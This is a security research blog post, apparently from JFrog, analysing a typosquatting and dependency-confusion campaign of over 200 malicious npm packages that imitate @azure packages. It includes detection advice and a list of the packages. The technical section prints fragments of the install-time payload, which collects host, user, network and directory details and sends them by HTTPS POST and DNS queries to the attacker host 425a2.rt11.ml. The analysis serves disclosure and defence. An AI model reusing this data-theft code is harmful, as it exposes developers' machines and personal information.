@@ -1,0 +1,331 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214505_468850\npmAttackTargetsAzureDevelopersSecurityresearchteam863x3001.png
+
+The JFrog Security research team continuously monitors popular open source software (OSS) repositories with our automated tooling to avert potential software supply chain security threats, and reports any vulnerabilities or malicious packages discovered to repository maintainers and the wider community.
+Two days ago, several of our automated analyzers started alerting on a set of packages in the npm Registry. This particular set of packages steadily grew over a few days, from about 50 packages to more than 200 packages (as of March 21st).
+After manually inspecting some of these packages, it became apparent that this was a targeted attack against the entire @azure npm scope, by an attacker that employed an automatic script to create accounts and upload malicious packages that cover the entirety of that scope. Currently, the observed malicious payload of these packages were PII (Personally identifiable information) stealers.
+The entire set of malicious packages was disclosed to the npm maintainers and the packages were quickly removed.
+Who is being targeted?
+The attacker seemed to target all npm developers that use any of the packages under the @azure scope, with a typosquatting attack.
+In addition to the @azure scope, a few packages from the following scopes were also targeted –  @azure-rest, @azure-tests, @azure-tools and @cadl-lang.
+Since this set of legitimate packages is downloaded tens of millions of times each week, there is a high chance that some developers will be successfully fooled by the typosquatting attack.
+What software supply chain attack method is used?
+The attack method is typosquatting – the attacker simply creates a new (malicious) package with the same name as an existing @azure scope package, but drops the scope name.
+For example, here is a legitimate azure npm package –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214505_468850\1_legitimateazurenpmpackage.png
+
+And its malicious counterpart –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214505_468850\2_maliciouscounterpart.png
+
+This was done for (at least) 218 packages. The full list of disclosed packages is posted on JFrog’s security research website and as an Appendix to this post.
+The attacker is relying on the fact that some developers may erroneously omit the @azure prefix when installing a package. For example, running npm install core-tracing by mistake, instead of the correct command – npm install @azure/core-tracing
+In addition to the typosquatting infection method, all of the malicious packages had extremely high version numbers (ex. 99.10.9) which is indicative of a dependency confusion attack. A possible conjecture is that the attacker tried to target developers and machines running from internal Microsoft/Azure networks, in addition to the typosquatting-based targeting of regular npm users. As mentioned, we did not pursue research on this attack vector and as such this is just a conjecture.
+Blurring the attack origins using automation
+Due to the scale of the attack, it is obvious that the attacker used a script to upload the malicious packages. The attacker also tried to hide the fact that all of these malicious packages were uploaded by the same author, by creating a unique user (with a randomly-generated name) per each malicious package uploaded –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214505_468850\Collaborators.png
+
+Technical analysis of the malicious payload
+As mentioned, the malicious payload of these packages was a PII stealing/reconnaissance payload.
+The malicious code runs automatically once the package is installed, and leaks the following details –
+
+Directory listing of the following directories (non-recursive) –
+
+C:\
+D:\
+/
+/home
+
+C:\
+D:\
+/
+/home
+The user’s username
+The user’s home directory
+The current working directory
+IP addresses of all network interfaces
+IP addresses of configured DNS servers
+The name of the (successful) attacking package
+const td = {
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: JSON.stringify(dns.getServers()),
+    ip: JSON.stringify(gethttpips()),
+    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"])),
+}
+These details are leaked via two exfiltration vectors –
+
+HTTPS POST to the hardcoded hostname – “425a2.rt11.ml”.
+DNS query to “<HEXSTR>.425a2.rt11.ml” where <HEXSTR> is replaced with the leaked details, concatenated together as a hex-string –
+var hostname = "425a2.rt11.ml";
+query_string=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+toHex(pkg.un)+"."+getPathChunks(pkg.c)+"."+getIps()+"."+hostname;
+...
+dns.lookup(query_string)
+We suspect that this malicious payload was either intended for initial reconnaissance on vulnerable targets (before sending a more substantial payload) or as a bug bounty hunting attempt against Azure users (and possibly Microsoft developers).
+The code also contains a set of clumsy tests, that presumably make sure the malicious payload does not run on the attacker’s own machines:
+function isValid(hostname, path, username, dirs) {
+    if (hostname == "DESKTOP-4E1IS0K" && username == "daasadmin" && path.startsWith('D:\\TRANSFER\\')) {
+        return false;
+    }
+    ...
+    else if (hostname == 'lili-pc') {
+        return false;
+    }
+    ...
+    else if (hostname == 'aws-7grara913oid5jsexgkq') {
+        return false;
+    }
+    ...
+    else if (hostname == 'instance') {
+        return false;
+    }
+    ...
+    return true;
+}
+I am using JFrog Xray, am I protected?
+JFrog Xray users are protected from this attack.
+The JFrog security research team adds all verified findings, such as discovered malicious packages and zero-day vulnerabilities in open-source packages, to our Xray database before any public disclosure. Any usage of these malicious packages is flagged in Xray as a vulnerability.
+As always, any malicious dependency flagged in Xray should be promptly removed.
+In addition to the protection given by Xray for detected malicious packages, JFrog Artifactory automatically protects users from dependency confusion attacks with its Priority Resolution feature, since artifacts hosted on repositories that have this feature turned on, will not be looked up in public repositories.
+I am an Azure developer using a targeted package, what should I do?
+Make sure your installed packages are the legitimate ones, by checking that their name starts with the @azure* scope.
+This can be done, for example, by changing your current directory to the npm project you would like to test, and running the following command –
+npm list | grep -f packages.txt
+Where “packages.txt” contains the full list of affected packages (see Appendix A).
+If any of the returned results does not begin with an “@azure*” scope, you might have been affected by this attack.
+Conclusion
+Luckily, since the packages were detected and disclosed very quickly (~2 days after they were published), it seems that they weren’t installed in large numbers. The package download numbers were uneven, but averaged around 50 downloads per package.
+It is clear that the npm maintainers are taking security very seriously. This was demonstrated many times by their actions, such as the preemptive blocking of specific package names to avoid future typosquatting and their two-factor-authentication requirement for popular package maintainers.
+However – due to the meteoric rise of supply chain attacks, especially through the npm and PyPI package repositories, it seems that more scrutiny and mitigations should be added. For example, adding a CAPTCHA mechanism on npm user creation would not allow attackers to easily create an arbitrary amount of users from which malicious packages could be uploaded, making attack identification easier (as well as enabling blocking of packages based on heuristics on the uploading account). In addition to that, the need for automatic package filtering as part of a secure software curation process, based on either SAST or DAST techniques (or preferably – both), is likely inevitable.
+Beyond the security capabilities provided with Xray, JFrog is providing several open source tools that can help with identifying malicious npm packages. These tools can either be integrated into your current CI/CD pipeline, or be run as standalone utilities.
+Stay Up-to-Date with JFrog Security Research
+Follow the latest discoveries and technical updates from the JFrog Security Research team in our security research website and on Twitter at @JFrogSecurity.
+Appendix A – The detected malicious packages
+
+
+npm install core-tracing
+npm install @azure/core-tracing
+
+C:\
+D:\
+/
+/home
+
+ai-anomaly-detector
+ai-document-translator
+arm-advisor
+arm-analysisservices
+arm-apimanagement
+arm-appconfiguration
+arm-appinsights
+arm-appplatform
+arm-appservice
+arm-attestation
+arm-authorization
+arm-avs
+arm-azurestack
+arm-azurestackhci
+arm-batch
+arm-billing
+arm-botservice
+arm-cdn
+arm-changeanalysis
+arm-cognitiveservices
+arm-commerce
+arm-commitmentplans
+arm-communication
+arm-compute
+arm-confluent
+arm-consumption
+arm-containerinstance
+arm-containerregistry
+arm-containerservice
+arm-cosmosdb
+arm-customerinsights
+arm-databox
+arm-databoxedge
+arm-databricks
+arm-datacatalog
+arm-datadog
+arm-datafactory
+arm-datalake-analytics
+arm-datamigration
+arm-deploymentmanager
+arm-desktopvirtualization
+arm-deviceprovisioningservices
+arm-devspaces
+arm-devtestlabs
+arm-digitaltwins
+arm-dns
+arm-dnsresolver
+arm-domainservices
+arm-eventgrid
+arm-eventhub
+arm-extendedlocation
+arm-features
+arm-frontdoor
+Arm-hanaonazure
+arm-hdinsight
+
+arm-healthcareapis
+arm-hybridcompute
+arm-hybridkubernetes
+arm-imagebuilder
+arm-iotcentral
+arm-iothub
+arm-keyvault
+arm-kubernetesconfiguration
+arm-labservices
+arm-links
+arm-loadtestservice
+arm-locks
+arm-logic
+arm-machinelearningcompute
+arm-machinelearningexperimentation
+arm-machinelearningservices
+arm-managedapplications
+arm-managementgroups
+arm-managementpartner
+arm-maps
+arm-mariadb
+arm-marketplaceordering
+arm-mediaservices
+arm-migrate
+arm-mixedreality
+arm-mobilenetwork
+arm-monitor
+arm-msi
+arm-mysql
+arm-netapp
+arm-network
+arm-notificationhubs
+arm-oep
+arm-operationalinsights
+arm-operations
+arm-orbital
+arm-peering
+arm-policy
+arm-portal
+arm-postgresql
+arm-postgresql-flexible
+arm-powerbidedicated
+arm-powerbiembedded
+arm-privatedns
+arm-purview
+arm-quota
+arm-recoveryservices
+arm-recoveryservices-siterecovery
+arm-recoveryservicesbackup
+arm-rediscache
+arm-redisenterprisecache
+arm-relay
+arm-reservations
+arm-resourcegraph
+
+arm-resourcemover
+arm-resources
+arm-resources-subscriptions
+arm-search
+arm-security
+arm-serialconsole
+arm-servicebus
+arm-servicefabric
+arm-servicefabricmesh
+arm-servicemap
+arm-signalr
+arm-sql
+arm-sqlvirtualmachine
+arm-storage
+arm-storagecache
+arm-storageimportexport
+arm-storagesync
+arm-storsimple1200series
+arm-storsimple8000series
+arm-streamanalytics
+arm-subscriptions
+arm-support
+arm-synapse
+arm-templatespecs
+arm-timeseriesinsights
+arm-trafficmanager
+arm-videoanalyzer
+arm-visualstudio
+arm-vmwarecloudsimple
+arm-webpubsub
+arm-webservices
+arm-workspaces
+cadl-autorest
+cadl-azure-core
+cadl-azure-resource-manager
+cadl-playground
+cadl-providerhub
+cadl-providerhub-controller
+cadl-providerhub-templates-contoso
+cadl-samples
+codemodel
+communication-chat
+communication-common
+communication-identity
+communication-network-traversal
+communication-phone-numbers
+communication-short-codes
+communication-sms
+confidential-ledger
+core-amqp
+core-asynciterator-polyfill
+core-auth
+core-client-1
+core-http
+
+core-lro
+core-paging
+core-rest-pipeline
+core-tracing
+core-xml
+deduplication
+digital-twins-core
+dll-docs
+dtdl-parser
+eslint-config-cadl
+eslint-plugin-azure-sdk
+eventhubs-checkpointstore-blob
+eventhubs-checkpointstore-table
+extension-base
+helloworld123ccwq
+identity-cache-persistence
+identity-vscode
+iot-device-update
+iot-device-update-1
+iot-modelsrepository
+keyvault-admin
+mixed-reality-authentication
+mixed-reality-remote-rendering
+modelerfour
+monitor-opentelemetry-exporter
+oai2-to-oai3
+openapi3
+opentelemetry-instrumentation-azure-sdk
+pnpmfile.js
+prettier-plugin-cadl
+purview-administration
+purview-catalog
+purview-scanning
+quantum-jobs
+storage-blob-changefeed
+storage-file-datalake
+storage-queue
+synapse-access-control
+synapse-artifacts
+synapse-managed-private-endpoints
+synapse-monitoring
+synapse-spark
+test-public-packages
+test-utils-perf
+testing-recorder-new
+testmodeler
+video-analyzer-edge
+videojs-wistia
+web-pubsub
+web-pubsub-express
